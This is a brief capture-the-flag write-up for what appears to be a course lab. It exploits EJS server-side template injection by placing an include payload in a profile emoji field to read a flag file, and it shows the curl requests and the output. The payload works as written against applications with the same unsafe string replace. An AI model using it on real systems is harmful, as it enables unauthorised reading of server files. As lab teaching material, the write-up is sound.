we need to exploit the ejs rendering in order to get the flag out

especially the line `const profilePage = data.replace(/<% profileEmoji %>/g, profile.emoji);` which does a replace before the templating takes place, allowing us to slip a template string in the payload.

we are going to use the ejs incude functionality to load a file server side ([documentation](https://ejs.co/))

with `curl`, post to `setEmoji` and set the value of `emoji` to: 
```
curl 'https://33acf8a1.proxy.coursestack.com/setEmoji' \
[...] \
--data-raw "emoji=<%- include(process.cwd().concat('/flag.txt'), {}) %>"

{"profileEmoji":"<%- include(process.cwd().concat('/flag.txt'), {}) %>"}%
```

then inspect the `/` page for the flag:
```
curl 'https://33acf8a1.proxy.coursestack.com' \
[...] \
| grep flag

<span id="currentEmoji">flag{8c8e0e59d1292298b64c625b401e8cfa}
```
